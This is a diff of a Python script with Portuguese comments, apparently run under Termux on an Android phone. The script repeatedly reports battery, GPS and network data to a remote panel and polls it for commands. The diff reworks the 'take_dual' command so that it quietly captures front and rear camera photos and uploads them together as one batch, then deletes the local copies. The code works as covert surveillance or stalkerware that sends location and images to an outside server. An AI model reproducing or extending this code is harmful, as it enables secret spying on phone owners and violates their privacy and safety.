@@ -8,7 +8,7 @@ import base64
 from datetime import datetime
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
-URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
+URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
 URL_PING = "https://nexos-panel.onrender.com/"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 
@@ -66,7 +66,6 @@ def obter_gps():
     gps_ok = False
 
 def enviar_dados(payload):
-    """Dados via CURL (rápido)"""
     json_str = json.dumps(payload).replace("'", "'\\''")
     cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
     resp = run(cmd, timeout=6)
@@ -75,29 +74,36 @@ def enviar_dados(payload):
     except:
         return None
 
-def enviar_foto(tipo, num):
-    """Fotos via requests (aguenta base64 grande)"""
-    arq = os.path.expanduser(f"~/nexos_{tipo}.jpg")
-    if os.path.exists(arq):
-        os.remove(arq)
-    
+def capturar_foto(num, arquivo):
+    """Tira a foto e retorna base64"""
+    if os.path.exists(arquivo):
+        os.remove(arquivo)
     try:
-        subprocess.run(f"termux-camera-photo -c {num} {arq}", shell=True, timeout=6)
-        time.sleep(1)
-        if os.path.exists(arq) and os.path.getsize(arq) > 100:
-            with open(arq, "rb") as f:
-                b64 = base64.b64encode(f.read()).decode('utf-8')
-            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}
-            r = requests.post(URL_UPLOAD_FOTO, json=payload, timeout=15)
-            os.remove(arq)
-            return r.status_code == 200
+        subprocess.run(f"termux-camera-photo -c {num} {arquivo}", shell=True, timeout=6)
+        time.sleep(1.5)
+        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 100:
+            with open(arquivo, "rb") as f:
+                return base64.b64encode(f.read()).decode('utf-8')
     except:
         pass
-    if os.path.exists(arq):
-        os.remove(arq)
-    return False
+    return None
 
-print("🛰️  INICIADO (curl dados + requests fotos)\n")
+def enviar_lote(front_b64, back_b64):
+    """Envia as DUAS fotos em UM pacote"""
+    if not front_b64 and not back_b64:
+        return False
+    payload = {
+        "device_id": DEVICE_ID,
+        "photo_front": front_b64 or "",
+        "photo_back": back_b64 or ""
+    }
+    try:
+        r = requests.post(URL_UPLOAD_LOTE, json=payload, timeout=20)
+        return r.status_code == 200
+    except:
+        return False
+
+print("🛰️  INICIADO (fotos em lote)\n")
 
 while True:
     t0 = time.time()
@@ -121,7 +127,7 @@ while True:
     # REDE
     rede = obter_rede()
     
-    # ENVIA DADOS VIA CURL
+    # ENVIA DADOS
     payload = {
         "device_id": DEVICE_ID,
         "battery": bat,
@@ -141,12 +147,31 @@ while True:
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
         
         if comando == "take_dual":
-            print("📸 Capturando...")
-            r1 = enviar_foto("back", 0)
-            print(f"   {'✅' if r1 else '❌'} Traseira")
-            time.sleep(0.5)
-            r2 = enviar_foto("front", 1)
-            print(f"   {'✅' if r2 else '❌'} Frontal")
+            print("📸 [DUAL] Tirando as duas fotos primeiro...")
+            
+            # PASSO 1: Tira as duas fotos
+            arq_tras = os.path.expanduser("~/nexos_back.jpg")
+            arq_front = os.path.expanduser("~/nexos_front.jpg")
+            
+            b64_tras = capturar_foto(0, arq_tras)
+            print(f"   {'✅' if b64_tras else '❌'} Traseira capturada")
+            
+            time.sleep(0.3)
+            
+            b64_front = capturar_foto(1, arq_front)
+            print(f"   {'✅' if b64_front else '❌'} Frontal capturada")
+            
+            # PASSO 2: Envia TUDO JUNTO
+            if b64_tras or b64_front:
+                print("📤 Enviando lote completo...")
+                if enviar_lote(b64_front, b64_tras):
+                    print("   ✅ LOTE ENVIADO!")
+                else:
+                    print("   ❌ Falha no envio")
+            
+            # Limpeza
+            for a in [arq_tras, arq_front]:
+                if os.path.exists(a): os.remove(a)
     else:
         print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
     
